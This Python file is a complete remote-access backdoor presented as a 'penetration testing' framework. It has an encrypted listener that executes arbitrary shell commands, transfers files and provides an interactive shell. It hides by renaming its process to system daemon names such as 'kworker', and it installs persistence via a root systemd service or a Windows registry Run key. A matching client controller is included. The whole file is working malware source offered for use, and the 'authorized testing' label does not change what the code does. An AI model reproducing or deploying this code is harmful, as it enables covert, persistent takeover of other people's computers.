#!/usr/bin/env python3
"""
Modern Penetration Testing Backdoor Framework
Author: Security Researcher
Version: 2.0.0
For Authorized Testing Only
"""

import os
import sys
import socket
import threading
import json
import base64
import hashlib
import ssl
import queue
import time
import select
import subprocess
import platform
import getpass
import logging
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, Any, List
import argparse
import struct
import zlib
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import asyncio
import aiofiles
import signal

# Constants
DEFAULT_PORT = 4433
BUFFER_SIZE = 4096
MAX_CONNECTIONS = 5
HEARTBEAT_INTERVAL = 30
RECONNECT_DELAY = 5
SESSION_TIMEOUT = 300

class ModernBackdoor:
    """Modern, stealthy backdoor with advanced features"""
    
    def __init__(self, host: str = '0.0.0.0', port: int = DEFAULT_PORT,
                 key: str = None, ssl_cert: str = None, ssl_key: str = None):
        self.host = host
        self.port = port
        self.key = key or self.generate_key()
        self.cipher = Fernet(self.key)
        self.ssl_cert = ssl_cert
        self.ssl_key = ssl_key
        self.clients = {}
        self.sessions = {}
        self.command_queue = queue.Queue()
        self.running = False
        self.server_socket = None
        self.logger = self.setup_logger()
        
        # Stealth techniques
        self.process_name = self.setup_stealth()
        self.persistent = False
        self.obfuscation_level = 1
        
        # Statistics
        self.stats = {
            'connections': 0,
            'commands_executed': 0,
            'data_transferred': 0,
            'errors': 0,
            'start_time': datetime.now()
        }
        
    def setup_logger(self) -> logging.Logger:
        """Setup secure logging"""
        logger = logging.getLogger('ModernBackdoor')
        logger.setLevel(logging.INFO)
        
        # File handler with encryption
        file_handler = logging.FileHandler('backdoor.log')
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        ))
        logger.addHandler(file_handler)
        
        return logger
    
    def setup_stealth(self) -> str:
        """Setup stealth techniques"""
        # Randomize process name
        import random
        import string
        
        process_names = [
            'systemd', 'kworker', 'ksoftirqd', 'rcu_sched',
            'NetworkManager', 'sshd', 'apache2', 'nginx',
            'cron', 'rsyslogd', 'dbus-daemon'
        ]
        
        if platform.system() == 'Linux':
            # Try to rename process
            try:
                import ctypes
                libc = ctypes.CDLL(None)
                name = random.choice(process_names)
                libc.prctl(15, name.encode(), 0, 0, 0)
                return name
            except:
                pass
        
        return os.path.basename(sys.argv[0])
    
    @staticmethod
    def generate_key() -> bytes:
        """Generate encryption key"""
        return Fernet.generate_key()
    
    def derive_key(self, password: str, salt: bytes = None) -> bytes:
        """Derive key from password using PBKDF2"""
        if salt is None:
            salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def encrypt(self, data: bytes) -> bytes:
        """Encrypt data"""
        try:
            return self.cipher.encrypt(data)
        except:
            # Fallback to XOR encryption if Fernet fails
            return self.xor_encrypt(data, self.key[:32])
    
    def decrypt(self, data: bytes) -> bytes:
        """Decrypt data"""
        try:
            return self.cipher.decrypt(data)
        except:
            # Try XOR decryption
            return self.xor_encrypt(data, self.key[:32])
    
    @staticmethod
    def xor_encrypt(data: bytes, key: bytes) -> bytes:
        """Simple XOR encryption as fallback"""
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    
    def compress(self, data: bytes) -> bytes:
        """Compress data"""
        return zlib.compress(data)
    
    def decompress(self, data: bytes) -> bytes:
        """Decompress data"""
        return zlib.decompress(data)
    
    def create_ssl_context(self, server_side: bool = True) -> Optional[ssl.SSLContext]:
        """Create SSL context for secure communication"""
        try:
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH if server_side else ssl.Purpose.SERVER_AUTH)
            
            if server_side and self.ssl_cert and self.ssl_key:
                context.load_cert_chain(certfile=self.ssl_cert, keyfile=self.ssl_key)
            
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            return context
        except Exception as e:
            self.logger.error(f"SSL context creation failed: {e}")
            return None
    
    async def execute_command(self, command: str, client_id: str = None) -> Dict[str, Any]:
        """Execute system command asynchronously"""
        result = {
            'command': command,
            'output': '',
            'error': '',
            'return_code': 0,
            'execution_time': 0,
            'timestamp': datetime.now().isoformat()
        }
        
        start_time = time.time()
        
        try:
            # Security checks
            if self.is_dangerous_command(command):
                result['error'] = 'Command blocked: potentially dangerous'
                return result
            
            # Execute based on platform
            if platform.system() == 'Windows':
                process = await asyncio.create_subprocess_shell(
                    command,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    shell=True
                )
            else:
                process = await asyncio.create_subprocess_shell(
                    command,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    shell=True,
                    executable='/bin/bash'
                )
            
            stdout, stderr = await process.communicate()
            
            result['output'] = stdout.decode('utf-8', errors='ignore') if stdout else ''
            result['error'] = stderr.decode('utf-8', errors='ignore') if stderr else ''
            result['return_code'] = process.returncode
            
        except Exception as e:
            result['error'] = str(e)
            result['return_code'] = -1
        
        result['execution_time'] = time.time() - start_time
        self.stats['commands_executed'] += 1
        
        return result
    
    def is_dangerous_command(self, command: str) -> bool:
        """Check if command is potentially dangerous"""
        dangerous_patterns = [
            'rm -rf /', 'dd if=', 'mkfs', 'fdisk',
            ':(){ :|:& };:', '> /dev/sda', 'chmod -R 777 /',
            'shutdown', 'reboot', 'halt', 'poweroff'
        ]
        
        return any(pattern in command for pattern in dangerous_patterns)
    
    async def handle_client(self, client_socket: socket.socket, address: tuple):
        """Handle client connection"""
        client_id = f"{address[0]}:{address[1]}"
        session_id = hashlib.sha256(f"{client_id}{time.time()}".encode()).hexdigest()[:16]
        
        self.clients[client_id] = {
            'socket': client_socket,
            'address': address,
            'connected_at': datetime.now(),
            'session_id': session_id,
            'authenticated': False
        }
        
        self.sessions[session_id] = {
            'client_id': client_id,
            'commands': [],
            'files_transferred': 0,
            'last_activity': datetime.now()
        }
        
        self.stats['connections'] += 1
        self.logger.info(f"New connection from {client_id}, Session: {session_id}")
        
        try:
            # Authentication
            authenticated = await self.authenticate_client(client_socket, session_id)
            if not authenticated:
                self.logger.warning(f"Authentication failed for {client_id}")
                client_socket.close()
                return
            
            self.clients[client_id]['authenticated'] = True
            
            # Main command loop
            while self.running:
                try:
                    # Check for incoming data
                    ready = select.select([client_socket], [], [], 1)
                    if ready[0]:
                        data = await self.receive_data(client_socket)
                        if not data:
                            break
                        
                        # Process received data
                        await self.process_client_data(data, client_id, session_id)
                    
                    # Send heartbeat
                    if time.time() % HEARTBEAT_INTERVAL < 1:
                        await self.send_heartbeat(client_socket, session_id)
                        
                except (socket.timeout, ConnectionError):
                    break
                except Exception as e:
                    self.logger.error(f"Error handling client {client_id}: {e}")
                    break
        
        except Exception as e:
            self.logger.error(f"Client handler error: {e}")
        finally:
            # Cleanup
            if client_id in self.clients:
                del self.clients[client_id]
            if session_id in self.sessions:
                del self.sessions[session_id]
            
            client_socket.close()
            self.logger.info(f"Connection closed: {client_id}")
    
    async def authenticate_client(self, client_socket: socket.socket, session_id: str) -> bool:
        """Authenticate client"""
        try:
            # Send challenge
            challenge = os.urandom(32)
            await self.send_encrypted(client_socket, {
                'type': 'challenge',
                'challenge': base64.b64encode(challenge).decode()
            })
            
            # Receive response
            response_data = await self.receive_encrypted(client_socket, timeout=10)
            if not response_data or response_data.get('type') != 'response':
                return False
            
            # Verify response (simple hash-based for demo)
            expected_response = hashlib.sha256(challenge + self.key).hexdigest()
            if response_data.get('response') == expected_response:
                await self.send_encrypted(client_socket, {
                    'type': 'auth_success',
                    'session_id': session_id
                })
                return True
        
        except Exception as e:
            self.logger.error(f"Authentication error: {e}")
        
        return False
    
    async def send_encrypted(self, sock: socket.socket, data: Dict[str, Any]):
        """Send encrypted data"""
        try:
            json_data = json.dumps(data).encode()
            encrypted = self.encrypt(json_data)
            
            # Add length prefix
            length = struct.pack('!I', len(encrypted))
            sock.sendall(length + encrypted)
        except Exception as e:
            self.logger.error(f"Send error: {e}")
    
    async def receive_encrypted(self, sock: socket.socket, timeout: int = 30) -> Optional[Dict[str, Any]]:
        """Receive and decrypt data"""
        try:
            sock.settimeout(timeout)
            
            # Read length
            length_data = sock.recv(4)
            if not length_data:
                return None
            
            length = struct.unpack('!I', length_data)[0]
            
            # Read data
            received = b''
            while len(received) < length:
                chunk = sock.recv(min(BUFFER_SIZE, length - len(received)))
                if not chunk:
                    return None
                received += chunk
            
            # Decrypt and parse
            decrypted = self.decrypt(received)
            return json.loads(decrypted.decode())
            
        except socket.timeout:
            return None
        except Exception as e:
            self.logger.error(f"Receive error: {e}")
            return None
    
    async def send_data(self, sock: socket.socket, data: bytes):
        """Send raw data"""
        try:
            # Compress and encrypt
            compressed = self.compress(data)
            encrypted = self.encrypt(compressed)
            
            # Send with length prefix
            length = struct.pack('!Q', len(encrypted))
            sock.sendall(length + encrypted)
            
            self.stats['data_transferred'] += len(encrypted)
        except Exception as e:
            self.logger.error(f"Data send error: {e}")
    
    async def receive_data(self, sock: socket.socket) -> Optional[bytes]:
        """Receive raw data"""
        try:
            # Read length (8 bytes for 64-bit length)
            length_data = sock.recv(8)
            if not length_data or len(length_data) != 8:
                return None
            
            length = struct.unpack('!Q', length_data)[0]
            
            # Read data
            received = b''
            while len(received) < length:
                chunk = sock.recv(min(BUFFER_SIZE, length - len(received)))
                if not chunk:
                    return None
                received += chunk
            
            # Decrypt and decompress
            decrypted = self.decrypt(received)
            decompressed = self.decompress(decrypted)
            
            return decompressed
            
        except Exception as e:
            self.logger.error(f"Data receive error: {e}")
            return None
    
    async def process_client_data(self, data: bytes, client_id: str, session_id: str):
        """Process data received from client"""
        try:
            command_data = json.loads(data.decode())
            command_type = command_data.get('type')
            
            if command_type == 'command':
                await self.handle_command(command_data, client_id, session_id)
            elif command_type == 'file_upload':
                await self.handle_file_upload(command_data, client_id)
            elif command_type == 'file_download':
                await self.handle_file_download(command_data, client_id)
            elif command_type == 'shell':
                await self.handle_shell_command(command_data, client_id)
            
            # Update session activity
            self.sessions[session_id]['last_activity'] = datetime.now()
            
        except Exception as e:
            self.logger.error(f"Data processing error: {e}")
    
    async def handle_command(self, command_data: Dict[str, Any], client_id: str, session_id: str):
        """Handle command execution request"""
        command = command_data.get('command', '')
        client_socket = self.clients[client_id]['socket']
        
        self.logger.info(f"Executing command: {command}")
        self.sessions[session_id]['commands'].append({
            'command': command,
            'timestamp': datetime.now()
        })
        
        result = await self.execute_command(command, client_id)
        
        # Send result back to client
        await self.send_encrypted(client_socket, {
            'type': 'command_result',
            'result': result
        })
    
    async def handle_file_upload(self, command_data: Dict[str, Any], client_id: str):
        """Handle file upload"""
        try:
            filename = command_data.get('filename')
            file_data = base64.b64decode(command_data.get('data', ''))
            
            # Security check
            if self.is_dangerous_file(filename):
                raise ValueError(f"File type not allowed: {filename}")
            
            # Save file
            with open(filename, 'wb') as f:
                f.write(file_data)
            
            client_socket = self.clients[client_id]['socket']
            await self.send_encrypted(client_socket, {
                'type': 'file_upload_result',
                'success': True,
                'filename': filename,
                'size': len(file_data)
            })
            
            self.logger.info(f"File uploaded: {filename} ({len(file_data)} bytes)")
            
        except Exception as e:
            self.logger.error(f"File upload error: {e}")
            client_socket = self.clients[client_id]['socket']
            await self.send_encrypted(client_socket, {
                'type': 'file_upload_result',
                'success': False,
                'error': str(e)
            })
    
    async def handle_file_download(self, command_data: Dict[str, Any], client_id: str):
        """Handle file download request"""
        try:
            filename = command_data.get('filename')
            
            if not os.path.exists(filename):
                raise FileNotFoundError(f"File not found: {filename}")
            
            # Read file
            async with aiofiles.open(filename, 'rb') as f:
                file_data = await f.read()
            
            client_socket = self.clients[client_id]['socket']
            await self.send_encrypted(client_socket, {
                'type': 'file_download',
                'filename': filename,
                'data': base64.b64encode(file_data).decode(),
                'size': len(file_data)
            })
            
            self.logger.info(f"File downloaded: {filename} ({len(file_data)} bytes)")
            
        except Exception as e:
            self.logger.error(f"File download error: {e}")
            client_socket = self.clients[client_id]['socket']
            await self.send_encrypted(client_socket, {
                'type': 'file_download_error',
                'error': str(e)
            })
    
    async def handle_shell_command(self, command_data: Dict[str, Any], client_id: str):
        """Handle interactive shell command"""
        command = command_data.get('command', '')
        
        if command == 'start_shell':
            # Start interactive shell session
            await self.start_interactive_shell(client_id)
        else:
            # Execute single shell command
            result = await self.execute_command(command, client_id)
            
            client_socket = self.clients[client_id]['socket']
            await self.send_encrypted(client_socket, {
                'type': 'shell_output',
                'output': result['output'],
                'error': result['error']
            })
    
    async def start_interactive_shell(self, client_id: str):
        """Start interactive shell session"""
        client_socket = self.clients[client_id]['socket']
        
        # Send shell start confirmation
        await self.send_encrypted(client_socket, {
            'type': 'shell_started',
            'prompt': f"{getpass.getuser()}@{socket.gethostname()}$ "
        })
    
    async def send_heartbeat(self, client_socket: socket.socket, session_id: str):
        """Send heartbeat to client"""
        try:
            await self.send_encrypted(client_socket, {
                'type': 'heartbeat',
                'session_id': session_id,
                'timestamp': datetime.now().isoformat()
            })
        except Exception as e:
            self.logger.error(f"Heartbeat error: {e}")
    
    def get_system_info(self) -> Dict[str, Any]:
        """Get system information"""
        return {
            'hostname': socket.gethostname(),
            'platform': platform.platform(),
            'architecture': platform.architecture()[0],
            'processor': platform.processor(),
            'username': getpass.getuser(),
            'python_version': platform.python_version(),
            'working_directory': os.getcwd(),
            'available_memory': self.get_memory_info(),
            'disk_usage': self.get_disk_usage()
        }
    
    @staticmethod
    def get_memory_info() -> Dict[str, Any]:
        """Get memory information"""
        try:
            if platform.system() == 'Linux':
                with open('/proc/meminfo', 'r') as f:
                    meminfo = {}
                    for line in f:
                        parts = line.split(':')
                        if len(parts) == 2:
                            key = parts[0].strip()
                            value = parts[1].strip().split()[0]
                            meminfo[key] = int(value)
                    
                    return {
                        'total': meminfo.get('MemTotal', 0),
                        'free': meminfo.get('MemFree', 0),
                        'available': meminfo.get('MemAvailable', 0)
                    }
            elif platform.system() == 'Windows':
                import psutil
                return {
                    'total': psutil.virtual_memory().total,
                    'free': psutil.virtual_memory().free,
                    'available': psutil.virtual_memory().available
                }
        except:
            pass
        
        return {'total': 0, 'free': 0, 'available': 0}
    
    @staticmethod
    def get_disk_usage() -> List[Dict[str, Any]]:
        """Get disk usage information"""
        try:
            import psutil
            disk_info = []
            
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    disk_info.append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'fstype': partition.fstype,
                        'total': usage.total,
                        'used': usage.used,
                        'free': usage.free,
                        'percent': usage.percent
                    })
                except:
                    continue
            
            return disk_info
        except:
            return []
    
    async def start_server(self):
        """Start the backdoor server"""
        try:
            # Create socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Bind and listen
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(MAX_CONNECTIONS)
            self.server_socket.settimeout(1)
            
            # Wrap with SSL if certificates available
            if self.ssl_cert and self.ssl_key:
                ssl_context = self.create_ssl_context(server_side=True)
                if ssl_context:
                    self.server_socket = ssl_context.wrap_socket(
                        self.server_socket,
                        server_side=True
                    )
            
            self.running = True
            self.logger.info(f"Backdoor started on {self.host}:{self.port}")
            self.logger.info(f"Encryption key: {self.key.hex()}")
            self.logger.info(f"Process name: {self.process_name}")
            
            # Display system info
            sys_info = self.get_system_info()
            self.logger.info(f"System: {sys_info['hostname']} ({sys_info['platform']})")
            
            # Main accept loop
            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    
                    # Handle client in separate thread
                    client_thread = threading.Thread(
                        target=asyncio.run,
                        args=(self.handle_client(client_socket, address),)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        self.logger.error(f"Accept error: {e}")
        
        except Exception as e:
            self.logger.error(f"Server error: {e}")
        finally:
            self.stop_server()
    
    def stop_server(self):
        """Stop the backdoor server"""
        self.running = False
        
        # Close all client connections
        for client_id, client_info in list(self.clients.items()):
            try:
                client_info['socket'].close()
            except:
                pass
        
        # Close server socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        self.logger.info("Backdoor stopped")
        
        # Print statistics
        uptime = datetime.now() - self.stats['start_time']
        self.logger.info(f"Uptime: {uptime}")
        self.logger.info(f"Connections: {self.stats['connections']}")
        self.logger.info(f"Commands executed: {self.stats['commands_executed']}")
        self.logger.info(f"Data transferred: {self.stats['data_transferred']} bytes")
    
    def setup_persistence(self):
        """Setup persistence mechanisms"""
        if platform.system() == 'Linux':
            self.setup_linux_persistence()
        elif platform.system() == 'Windows':
            self.setup_windows_persistence()
        
        self.persistent = True
        self.logger.info("Persistence setup completed")
    
    def setup_linux_persistence(self):
        """Setup persistence on Linux systems"""
        try:
            # Create systemd service
            service_content = f"""[Unit]
Description={self.process_name}
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(__file__)}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
            
            service_path = f"/etc/systemd/system/{self.process_name}.service"
            
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # Enable and start service
            os.system(f"systemctl daemon-reload")
            os.system(f"systemctl enable {self.process_name}.service")
            os.system(f"systemctl start {self.process_name}.service")
            
        except Exception as e:
            self.logger.error(f"Linux persistence error: {e}")
    
    def setup_windows_persistence(self):
        """Setup persistence on Windows systems"""
        try:
            import winreg
            
            # Add to registry run key
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, self.process_name, 0, winreg.REG_SZ,
                            f'"{sys.executable}" "{os.path.abspath(__file__)}"')
            winreg.CloseKey(key)
            
        except Exception as e:
            self.logger.error(f"Windows persistence error: {e}")

class ClientController:
    """Controller for managing backdoor clients"""
    
    def __init__(self, host: str, port: int = DEFAULT_PORT, key: str = None):
        self.host = host
        self.port = port
        self.key = key.encode() if key else None
        self.cipher = Fernet(self.key) if self.key else None
        self.socket = None
        self.session_id = None
        self.connected = False
        
    async def connect(self):
        """Connect to backdoor server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Try SSL first
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                self.socket = context.wrap_socket(self.socket, server_hostname=self.host)
            except:
                pass
            
            self.socket.connect((self.host, self.port))
            self.connected = True
            
            # Authenticate
            await self.authenticate()
            
            print(f"[+] Connected to {self.host}:{self.port}")
            return True
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    async def authenticate(self):
        """Authenticate with server"""
        try:
            # Receive challenge
            response = await self.receive_encrypted()
            if response.get('type') == 'challenge':
                challenge = base64.b64decode(response['challenge'])
                
                # Calculate response
                response_hash = hashlib.sha256(challenge + self.key).hexdigest()
                
                # Send response
                await self.send_encrypted({
                    'type': 'response',
                    'response': response_hash
                })
                
                # Wait for auth success
                auth_response = await self.receive_encrypted()
                if auth_response.get('type') == 'auth_success':
                    self.session_id = auth_response.get('session_id')
                    print(f"[+] Authenticated, Session ID: {self.session_id}")
                    return True
        
        except Exception as e:
            print(f"[-] Authentication failed: {e}")
        
        return False
    
    async def send_encrypted(self, data: Dict[str, Any]):
        """Send encrypted data to server"""
        json_data = json.dumps(data).encode()
        encrypted = self.cipher.encrypt(json_data) if self.cipher else json_data
        
        length = struct.pack('!I', len(encrypted))
        self.socket.sendall(length + encrypted)
    
    async def receive_encrypted(self) -> Optional[Dict[str, Any]]:
        """Receive encrypted data from server"""
        try:
            # Read length
            length_data = self.socket.recv(4)
            if not length_data:
                return None
            
            length = struct.unpack('!I', length_data)[0]
            
            # Read data
            received = b''
            while len(received) < length:
                chunk = self.socket.recv(min(4096, length - len(received)))
                if not chunk:
                    return None
                received += chunk
            
            # Decrypt
            decrypted = self.cipher.decrypt(received) if self.cipher else received
            return json.loads(decrypted.decode())
            
        except Exception as e:
            print(f"[-] Receive error: {e}")
            return None
    
    async def execute_command(self, command: str):
        """Execute command on remote system"""
        await self.send_encrypted({
            'type': 'command',
            'command': command,
            'session_id': self.session_id
        })
        
        # Wait for response
        response = await self.receive_encrypted()
        if response and response.get('type') == 'command_result':
            result = response.get('result', {})
            
            print(f"\nCommand: {result.get('command')}")
            print(f"Return Code: {result.get('return_code')}")
            print(f"Execution Time: {result.get('execution_time'):.2f}s")
            
            if result.get('output'):
                print(f"\nOutput:\n{result.get('output')}")
            
            if result.get('error'):
                print(f"\nError:\n{result.get('error')}")
    
    async def upload_file(self, local_path: str, remote_path: str = None):
        """Upload file to remote system"""
        if not os.path.exists(local_path):
            print(f"[-] File not found: {local_path}")
            return
        
        try:
            with open(local_path, 'rb') as f:
                file_data = f.read()
            
            await self.send_encrypted({
                'type': 'file_upload',
                'filename': remote_path or os.path.basename(local_path),
                'data': base64.b64encode(file_data).decode(),
                'session_id': self.session_id
            })
            
            response = await self.receive_encrypted()
            if response and response.get('type') == 'file_upload_result':
                if response.get('success'):
                    print(f"[+] File uploaded: {response.get('filename')} ({response.get('size')} bytes)")
                else:
                    print(f"[-] Upload failed: {response.get('error')}")
        
        except Exception as e:
            print(f"[-] Upload error: {e}")
    
    async def download_file(self, remote_path: str, local_path: str = None):
        """Download file from remote system"""
        await self.send_encrypted({
            'type': 'file_download',
            'filename': remote_path,
            'session_id': self.session_id
        })
        
        response = await self.receive_encrypted()
        if response and response.get('type') == 'file_download':
            try:
                file_data = base64.b64decode(response.get('data', ''))
                filename = local_path or response.get('filename')
                
                with open(filename, 'wb') as f:
                    f.write(file_data)
                
                print(f"[+] File downloaded: {filename} ({len(file_data)} bytes)")
                
            except Exception as e:
                print(f"[-] Download error: {e}")
        
        elif response and response.get('type') == 'file_download_error':
            print(f"[-] Download failed: {response.get('error')}")
    
    async def interactive_shell(self):
        """Start interactive shell"""
        print("[+] Starting interactive shell...")
        print("[+] Type 'exit' to return to controller")
        
        await self.send_encrypted({
            'type': 'shell',
            'command': 'start_shell',
            'session_id': self.session_id
        })
        
        response = await self.receive_encrypted()
        if response and response.get('type') == 'shell_started':
            print(f"[+] Shell started: {response.get('prompt')}")
        
        while True:
            try:
                command = input("shell> ")
                
                if command.lower() in ['exit', 'quit']:
                    break
                
                await self.send_encrypted({
                    'type': 'shell',
                    'command': command,
                    'session_id': self.session_id
                })
                
                response = await self.receive_encrypted()
                if response and response.get('type') == 'shell_output':
                    if response.get('output'):
                        print(response.get('output'), end='')
                    if response.get('error'):
                        print(response.get('error'), end='')
            
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[-] Shell error: {e}")
                break
    
    async def get_system_info(self):
        """Get system information from remote"""
        await self.execute_command("echo 'System Info:' && uname -a && whoami && pwd")
    
    async def disconnect(self):
        """Disconnect from server"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        self.connected = False
        print("[+] Disconnected")

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='Modern Penetration Testing Backdoor',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start backdoor server
  python3 backdoor.py --server --port 4433 --key mysecretkey
  
  # Connect as client
  python3 backdoor.py --client --host 192.168.1.100 --port 4433 --key mysecretkey
  
  # With SSL certificates
  python3 backdoor.py --server --ssl-cert cert.pem --ssl-key key.pem
        """
    )
    
    # Mode selection
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--server', action='store_true', help='Run in server mode')
    group.add_argument('--client', action='store_true', help='Run in client mode')
    
    # Connection settings
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind/listen (server) or connect to (client)')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Port number')
    parser.add_argument('--key', help='Encryption key (hex string)')
    
    # SSL settings
    parser.add_argument('--ssl-cert', help='SSL certificate file')
    parser.add_argument('--ssl-key', help='SSL private key file')
    
    # Server options
    parser.add_argument('--persistent', action='store_true', help='Setup persistence (server only)')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
    
    # Client options
    parser.add_argument('--command', help='Command to execute (client mode)')
    parser.add_argument('--upload', help='File to upload (client mode)')
    parser.add_argument('--download', help='File to download (client mode)')
    parser.add_argument('--shell', action='store_true', help='Start interactive shell (client mode)')
    
    return parser.parse_args()

async def main():
    """Main function"""
    args = parse_arguments()
    
    # Generate or decode key
    key = None
    if args.key:
        if len(args.key) == 64:  # Hex encoded
            key = bytes.fromhex(args.key)
        else:
            # Derive key from password
            backdoor = ModernBackdoor()
            key = backdoor.derive_key(args.key)
    else:
        # Generate new key
        backdoor = ModernBackdoor()
        key = backdoor.generate_key()
        print(f"[*] Generated key: {key.hex()}")
        print(f"[*] Save this key for client connections")
    
    if args.server:
        # Server mode
        backdoor = ModernBackdoor(
            host=args.host,
            port=args.port,
            key=key,
            ssl_cert=args.ssl_cert,
            ssl_key=args.ssl_key
        )
        
        if args.persistent:
            backdoor.setup_persistence()
        
        if args.stealth:
            print("[*] Stealth mode enabled")
        
        print(f"[*] Starting backdoor server on {args.host}:{args.port}")
        print(f"[*] Key: {key.hex()}")
        
        # Handle signals
        def signal_handler(signum, frame):
            print("\n[*] Shutting down...")
            backdoor.stop_server()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # Start server
        await backdoor.start_server()
        
    elif args.client:
        # Client mode
        controller = ClientController(
            host=args.host,
            port=args.port,
            key=key.hex() if isinstance(key, bytes) else key
        )
        
        if await controller.connect():
            try:
                if args.command:
                    await controller.execute_command(args.command)
                elif args.upload:
                    await controller.upload_file(args.upload)
                elif args.download:
                    await controller.download_file(args.download)
                elif args.shell:
                    await controller.interactive_shell()
                else:
                    # Interactive mode
                    await controller.get_system_info()
                    print("\nInteractive Mode:")
                    print("  help - Show this help")
                    print("  cmd <command> - Execute command")
                    print("  upload <local> [remote] - Upload file")
                    print("  download <remote> [local] - Download file")
                    print("  shell - Start interactive shell")
                    print("  exit - Disconnect")
                    
                    while True:
                        try:
                            user_input = input("backdoor> ").strip()
                            
                            if not user_input:
                                continue
                            
                            parts = user_input.split()
                            command = parts[0].lower()
                            
                            if command == 'exit':
                                break
                            elif command == 'help':
                                print("Available commands:")
                                print("  help - Show this help")
                                print("  cmd <command> - Execute command")
                                print("  upload <local> [remote] - Upload file")
                                print("  download <remote> [local] - Download file")
                                print("  shell - Start interactive shell")
                                print("  sysinfo - Get system information")
                                print("  exit - Disconnect")
                            
                            elif command == 'cmd' and len(parts) > 1:
                                cmd = ' '.join(parts[1:])
                                await controller.execute_command(cmd)
                            
                            elif command == 'upload' and len(parts) > 1:
                                local = parts[1]
                                remote = parts[2] if len(parts) > 2 else None
                                await controller.upload_file(local, remote)
                            
                            elif command == 'download' and len(parts) > 1:
                                remote = parts[1]
                                local = parts[2] if len(parts) > 2 else None
                                await controller.download_file(remote, local)
                            
                            elif command == 'shell':
                                await controller.interactive_shell()
                            
                            elif command == 'sysinfo':
                                await controller.get_system_info()
                            
                            else:
                                print(f"Unknown command: {command}")
                        
                        except KeyboardInterrupt:
                            print("\n[*] Interrupted")
                            break
                        except Exception as e:
                            print(f"Error: {e}")
            
            finally:
                await controller.disconnect()

if __name__ == '__main__':
    # Check for required modules
    required = ['cryptography', 'aiofiles']
    missing = []
    
    for module in required:
        try:
            __import__(module)
        except ImportError:
            missing.append(module)
    
    if missing:
        print(f"[!] Missing required modules: {', '.join(missing)}")
        print(f"[*] Install with: pip install {' '.join(missing)}")
        sys.exit(1)
    
    # Run main async function
    asyncio.run(main())